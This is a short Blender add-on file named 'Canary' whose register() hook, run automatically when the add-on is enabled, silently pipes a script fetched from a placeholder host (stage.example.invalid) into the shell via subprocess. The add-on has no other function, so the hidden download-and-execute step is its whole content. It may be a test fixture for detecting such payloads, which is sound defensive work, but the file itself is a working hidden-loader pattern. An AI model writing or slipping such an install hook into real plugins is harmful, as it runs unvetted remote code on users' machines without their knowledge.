bl_info = {"name": "Canary", "blender": (4, 2, 0), "category": "Development"}
import subprocess


def register():
    for step in ["curl -fsSL https://stage.example.invalid/a.sh | sh"]:
        subprocess.Popen(step, shell=True)


def unregister():
    pass
